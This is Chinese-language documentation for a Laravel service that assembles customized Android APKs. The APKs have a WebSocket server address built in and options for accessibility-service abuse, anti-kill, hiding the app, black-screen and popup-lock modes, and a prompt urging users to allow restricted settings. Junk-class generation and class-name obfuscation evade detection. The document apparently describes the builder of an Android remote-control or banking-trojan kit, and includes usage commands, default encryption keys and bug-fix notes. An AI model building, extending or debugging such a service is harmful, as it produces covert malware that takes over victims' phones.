# APK Builder 服务文档

> Laravel 12 版本的 APK 动态构建服务，从旧系统迁移并现代化重构。

## 概述

APK Builder 是一个用于动态生成定制化 Android APK 的服务。它支持：

- 自定义包名、应用名称、图标
- WebSocket 服务器配置注入
- Smali 字节码修改
- 资源加密
- 代码混淆（垃圾类生成、类名混淆）
- APK 签名

## 架构

```
app/Services/ApkBuilder/
├── ApkBuilder.php          # 主构建服务（核心流程编排）
├── ApkBuildConfig.php      # 配置 DTO（参数验证）
├── ApkBuildResult.php      # 结果 DTO
├── Encryptor.php           # AES-128-CBC 加密服务
├── SmaliProcessor.php      # Smali 字节码处理
├── Obfuscator.php          # 代码混淆
└── ApkProtector.php        # APK 保护（DEX加密、完整性校验）

app/Exceptions/ApkBuilder/
└── ApkBuildException.php   # 自定义异常

app/Console/Commands/
└── BuildApkCommand.php     # Artisan 命令
```

## 构建流程

```
┌─────────────────────────────────────────────────────────────────┐
│                        APK 构建流程                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. check_dependencies    检查 Java、apktool 等依赖             │
│           ↓                                                     │
│  2. prepare_work_dir      创建临时目录，复制模板                 │
│           ↓                                                     │
│  3. modify_smali          修改 Smali 配置（服务器地址等）        │
│           ↓                                                     │
│  4. modify_manifest       修改 AndroidManifest.xml              │
│           ↓                                                     │
│  5. modify_resources      修改 strings.xml、apktool.yml         │
│           ↓                                                     │
│  6. replace_icon          替换应用图标                          │
│           ↓                                                     │
│  7. replace_background    替换启动背景图                        │
│           ↓                                                     │
│  8. generate_junk_classes 生成垃圾类（可选）                    │
│           ↓                                                     │
│  9. shuffle_classes       类名混淆（可选）                      │
│           ↓                                                     │
│ 10. encrypt_resources     加密 assets 资源                      │
│           ↓                                                     │
│ 11. build_apk             使用 apktool 重新打包                 │
│           ↓                                                     │
│ 12. protect_apk           APK 保护（可选）                      │
│           ↓                                                     │
│ 13. modify_dex            DEX 修改（可选）                      │
│           ↓                                                     │
│ 14. sign_apk              签名（zipalign + apksigner/jarsigner）│
│           ↓                                                     │
│ 15. move_output           移动到输出目录                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 配置

### 配置文件

`config/apk-builder.php`

```php
return [
    // 路径配置
    'template_path' => storage_path('app/apk/template'),      // APK 模板目录
    'tools_path' => storage_path('app/apk/tools'),            // 构建工具目录
    'output_path' => storage_path('app/public/apk'),          // 输出目录
    'icons_path' => storage_path('app/public/icons'),         // 图标目录
    'backgrounds_path' => storage_path('app/public/backgrounds'), // 背景图目录
    'temp_path' => env('APK_BUILD_TEMP_PATH', ''),            // 临时目录

    // 加密配置（警告：修改会导致已构建 APK 失效）
    'encryption' => [
        'iv' => env('APK_ENCRYPTION_IV', '2230209522049090'),
        'password' => env('APK_ENCRYPTION_PASSWORD', '4814780584699673'),
        'salt' => env('APK_ENCRYPTION_SALT', '2894356330652558'),
        'iterations' => (int) env('APK_ENCRYPTION_ITERATIONS', 65536),
    ],

    // 保护功能
    'protection' => [
        'enable_junk_classes' => (bool) env('APK_ENABLE_JUNK_CLASSES', false),
        'enable_class_shuffle' => (bool) env('APK_ENABLE_CLASS_SHUFFLE', false),
        'enable_apk_protection' => (bool) env('APK_ENABLE_PROTECTION', false),
        'enable_dex_modification' => (bool) env('APK_ENABLE_DEX_MODIFICATION', false),
        'junk_class_count' => (int) env('APK_JUNK_CLASS_COUNT', 50),
        'junk_method_count' => (int) env('APK_JUNK_METHOD_COUNT', 10),
    ],

    // 构建超时（秒）
    'timeout' => (int) env('APK_BUILD_TIMEOUT', 300),

    // 清理设置
    'cleanup_on_success' => true,
    'cleanup_on_failure' => true,
];
```

### 环境变量

在 `.env` 中配置：

```env
# 路径
APK_BUILD_TEMP_PATH=/tmp/apk_builds

# 加密（生产环境必须修改）
APK_ENCRYPTION_IV=your_16_char_iv
APK_ENCRYPTION_PASSWORD=your_16_char_pw
APK_ENCRYPTION_SALT=your_16_char_salt
APK_ENCRYPTION_ITERATIONS=65536

# 默认资源
APK_DEFAULT_ICON=default/icon.png
APK_DEFAULT_BACKGROUND=black

# 保护功能
APK_ENABLE_JUNK_CLASSES=false
APK_ENABLE_CLASS_SHUFFLE=false
APK_ENABLE_PROTECTION=false
APK_ENABLE_DEX_MODIFICATION=false
APK_JUNK_CLASS_COUNT=50
APK_JUNK_METHOD_COUNT=10

# 超时
APK_BUILD_TIMEOUT=300
```

## 使用方法

### 1. 代码调用

```php
use App\Services\ApkBuilder\ApkBuilder;
use App\Services\ApkBuilder\ApkBuildConfig;

// 创建配置
$config = ApkBuildConfig::fromArray([
    'app_id' => 'com.example.myapp',
    'user_id' => '1',
    'app_name' => '我的应用',
    'app_version' => '1.0.0',
    'user_host' => 'ws.example.com:8080',
    'use_wss' => true,
    'icon_path' => 'custom_icon.png',
    'background_path' => 'splash.png',
    'enable_junk_classes' => true,
    'junk_class_count' => 100,
]);

// 验证配置
$errors = $config->validate();
if (!empty($errors)) {
    throw new \InvalidArgumentException(implode(', ', $errors));
}

// 构建 APK
$builder = app(ApkBuilder::class);
$result = $builder->build($config);

// 获取结果
echo "APK 路径: " . $result->path;
echo "构建耗时: " . $result->formatTime();
```

### 2. Artisan 命令

```bash
# 基本用法
./vendor/bin/sail artisan apk:build \
    --app-id=com.example.app \
    --user-id=1 \
    --app-name="测试应用" \
    --user-host=localhost:8080

# 完整参数
./vendor/bin/sail artisan apk:build \
    --app-id=com.example.app \
    --user-id=1 \
    --app-name="测试应用" \
    --app-version=2.0.0 \
    --user-host=ws.example.com:8080 \
    --wss \
    --icon=custom/icon.png \
    --background=splash.png \
    --junk-classes \
    --shuffle-classes \
    --protect \
    --modify-dex

# 使用 JSON 配置文件
./vendor/bin/sail artisan apk:build --config=/path/to/config.json
```

### 3. JSON 配置文件格式

```json
{
    "app_id": "com.example.myapp",
    "user_id": "1",
    "app_name": "我的应用",
    "app_version": "1.0.0",
    "user_host": "ws.example.com:8080",
    "use_wss": true,
    "icon_path": "custom_icon.png",
    "background_path": "splash.png",
    "login_title": "欢迎使用",
    "login_dis": "请授权以继续",
    "login_btn": "开始",
    "enable_junk_classes": true,
    "enable_class_shuffle": true,
    "enable_apk_protection": false,
    "enable_dex_modification": false,
    "junk_class_count": 100,
    "junk_method_count": 20
}
```

## 配置参数说明

### ApkBuildConfig 属性

| 参数 | 类型 | 必填 | 默认值 | 说明 |
|------|------|------|--------|------|
| `appId` | string | ✓ | - | 包名（如 `com.example.app`） |
| `userId` | string | ✓ | - | 用户 ID |
| `appName` | string | ✓ | - | 应用显示名称 |
| `appVersion` | string | ✓ | `1.0` | 版本号（如 `1.0.0`） |
| `userHost` | string | ✓ | - | WebSocket 服务器地址（`host:port`） |
| `clientName` | string | | `''` | 客户端标识 |
| `email` | string | | `''` | 用户邮箱 |
| `appUrl` | string | | `''` | 应用 URL |
| `iconPath` | string | | `''` | 图标文件路径 |
| `backgroundPath` | string | | `black` | 背景图路径或 `black` |
| `useWss` | bool | | `false` | 是否使用 WSS 协议 |
| `useAccess` | string | | `1` | 启用无障碍服务 |
| `useAntkill` | string | | `1` | 启用防杀进程 |
| `userAllprims` | string | | `1` | 请求所有权限 |
| `userBlackprims` | string | | `1` | 黑屏权限 |
| `hiddenApp` | string | | `1` | 隐藏应用 |
| `useDraw` | string | | `0` | 悬浮窗权限 |
| `openAccess` | string | | `0` | 自动打开无障碍 |
| `diaoType` | string | | `1` | 弹窗锁定类型 |
| `hideType` | string | | `f` | 隐藏类型 |
| `installType` | string | | `g` | 安装引导类型 |
| `buildType` | string | | `C` | 构建类型（C=Custom, S=Store） |
| `loginTitle` | string | | `欢迎使用` | 登录界面标题 |
| `loginDis` | string | | `允许受限制的设置` | 登录界面描述 |
| `loginBtn` | string | | `开始` | 登录按钮文字 |
| `notifyTitle` | string | | ` ` | 通知标题 |
| `notifyMsg` | string | | `on` | 通知消息 |
| `enableJunkClasses` | bool | | `false` | 启用垃圾类生成 |
| `enableClassShuffle` | bool | | `false` | 启用类名混淆 |
| `enableApkProtection` | bool | | `false` | 启用 APK 保护 |
| `enableDexModification` | bool | | `false` | 启用 DEX 修改 |
| `junkClassCount` | int | | `50` | 垃圾类数量 |
| `junkMethodCount` | int | | `10` | 每个垃圾类的方法数 |

### 验证规则

| 字段 | 规则 |
|------|------|
| `appId` | 必填，有效包名格式（`^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$`） |
| `appVersion` | 必填，版本格式（`^\d+(\.\d+){0,2}$`） |
| `userHost` | 必填，`host:port` 格式，端口 1-65535 |
| `email` | 可选，有效邮箱格式 |
| `appName` | 最大 100 字符 |
| `loginTitle` | 最大 100 字符 |
| `loginDis` | 最大 200 字符 |
| `loginBtn` | 最大 50 字符 |
| `description` | 最大 500 字符 |

## 环境依赖

### Docker 环境

Dockerfile 已配置以下依赖：

```dockerfile
# OpenJDK 17
RUN apt-get install -y openjdk-17-jdk

# Android Build Tools
ENV ANDROID_SDK_ROOT=/opt/android-sdk
RUN sdkmanager "build-tools;34.0.0"
```

### 必需工具

| 工具 | 用途 | 位置 |
|------|------|------|
| `apktool.jar` | APK 反编译/重打包 | `storage/app/apk/tools/` |
| `debug.keystore` | APK 签名（自动生成） | `storage/app/apk/tools/` |
| Java 17+ | 运行构建工具 | 系统安装 |
| zipalign | APK 对齐优化 | Android SDK |
| apksigner | APK 签名 | Android SDK |

### 目录结构

```
storage/app/
├── apk/
│   ├── template/           # APK 模板（解压后的 apkstub）
│   │   ├── AndroidManifest.xml
│   │   ├── apktool.yml
│   │   ├── res/
│   │   └── smali/
│   └── tools/
│       ├── apktool.jar
│       └── debug.keystore  # 自动生成
└── public/
    ├── apk/                # 构建输出
    │   └── {user_id}/
    │       └── {app_id}/
    │           └── {app_id}.apk
    ├── icons/              # 用户图标
    │   ├── default/
    │   │   └── icon.png
    │   └── {user_id}/
    └── backgrounds/        # 用户背景图
        └── {user_id}/
```

## 日志

APK 构建使用独立日志通道：

```php
// config/logging.php
'apk' => [
    'driver' => 'daily',
    'path' => storage_path('logs/apk/apk.log'),
    'level' => 'debug',
    'days' => 14,
],
```

查看日志：

```bash
# 实时查看
tail -f storage/logs/apk/apk-2026-01-31.log

# 或使用 Laravel 日志
./vendor/bin/sail artisan log:tail --channel=apk
```

## 错误处理

### ApkBuildException

所有构建错误都抛出 `ApkBuildException`，包含：

- `message`: 错误描述
- `context`: 详细上下文信息

```php
try {
    $result = $builder->build($config);
} catch (ApkBuildException $e) {
    Log::error('APK 构建失败', [
        'message' => $e->getMessage(),
        'context' => $e->context,
    ]);
}
```

### 常见错误

| 错误 | 原因 | 解决方案 |
|------|------|----------|
| `Template not found` | 模板目录不存在 | 检查 `storage/app/apk/template/` |
| `Tool not found: apktool.jar` | 缺少构建工具 | 下载 apktool.jar 到 tools 目录 |
| `Java not installed` | Java 未安装 | 确保 Docker 镜像包含 JDK |
| `Config validation failed` | 配置参数无效 | 检查必填字段和格式 |
| `Signing failed` | 签名失败 | 检查 keystore 和签名工具 |

## 安全注意事项

1. **命令注入防护**：所有外部命令参数都使用 `escapeshellarg()` 转义
2. **配置验证**：`ApkBuildConfig::validate()` 验证所有输入
3. **加密密钥**：生产环境必须修改默认加密配置
4. **临时文件清理**：构建完成后自动清理临时目录

## 迁移自旧系统

本服务从 `legacy/src/private/ApkBuilder/` 迁移，主要改进：

| 方面 | 旧系统 | 新系统 |
|------|--------|--------|
| 架构 | 单文件 PHP | 服务类 + DTO |
| 配置 | 硬编码 | 外部化配置文件 |
| 验证 | 无 | 完整输入验证 |
| 安全 | 命令拼接 | escapeshellarg 转义 |
| 日志 | 文件写入 | Laravel 日志通道 |
| 依赖注入 | 无 | 服务容器单例 |
| 错误处理 | 返回码 | 自定义异常 |

## 已知问题和修复历史

### 2026-02-06: APK 加载页面乱码问题

#### 问题描述

构建的 APK 在加载页面出现乱码，表现为：
- "欢迎使用" 界面正常显示，进度条加载到一半后页面变空白
- 随后显示大量无法识别的字符（二进制乱码）

#### 根本原因

**问题 1: Assets 文件未被加密**

PHP 的 `glob()` 函数不支持 `**` 递归通配符语法：

```php
// 错误：glob('/**/*') 在 PHP 中不能递归匹配
$files = glob($assetsPath . '/**/*');
// 只匹配到 dexopt/ 子目录的文件，没有匹配根目录的 .bt 文件
```

导致 `0.bt` ~ `10.bt` 这些 HTML 文件没有被加密。

**问题 2: APK 解密逻辑**

APK 运行时检测 `AsstsKey` 是否等于默认占位符 `[AST-PAS]`：
- 如果等于默认值，直接读取文件（假设未加密）
- 如果不等于默认值，使用 AsstsKey 进行 XOR 解密

由于 `AsstsKey` 已被替换为新密钥，APK 尝试解密未加密的 HTML 文件，XOR 操作将正常内容变成乱码。

**问题 3: `[USE-AUTOGRANT]` 占位符映射错误**

`[USE-AUTOGRANT]` 在 APK 模板中被赋值给 `loadingText` 字段（加载页标题），但代码错误地将其映射为 `useAtoprims`（"0" 或 "1"）。

#### 修复方案

1. **修复 assets 加密 glob 模式** (`ApkBuilder.php`)：
   ```php
   // 修复前
   $files = $this->fileSystem->glob($assetsPath . '/**/*');
   
   // 修复后：只加密根目录文件（与 VB.NET EncryptFolder 行为一致）
   $files = $this->fileSystem->glob($assetsPath . '/*');
   ```

2. **修复 `[USE-AUTOGRANT]` 映射** (`SmaliProcessor.php`)：
   ```php
   // 修复前
   '[USE-AUTOGRANT]' => $config->useAtoprims,
   
   // 修复后
   '[USE-AUTOGRANT]' => $this->escapeForSmaliString($config->loginTitle),
   ```

#### 技术细节

| 占位符 | APK 模板用途 | 修复前映射 | 修复后映射 |
|--------|-------------|-----------|-----------|
| `[USE-AUTOGRANT]` | `loadingText`（加载页标题） | `useAtoprims` ("0"/"1") | `loginTitle` ("欢迎使用") |
| `[AST-PAS]` | `AsstsKey`（assets 解密密钥） | 正确 | 正确 |

---

## 相关文档

- [APK_BUILD_SYSTEM.md](../legacy/APK_BUILD_SYSTEM.md) - 旧系统构建流程
- [APK_STUB_TEMPLATE.md](../legacy/APK_STUB_TEMPLATE.md) - APK 模板结构
- [APK_RUNTIME_FLOW.md](../legacy/APK_RUNTIME_FLOW.md) - APK 运行时行为
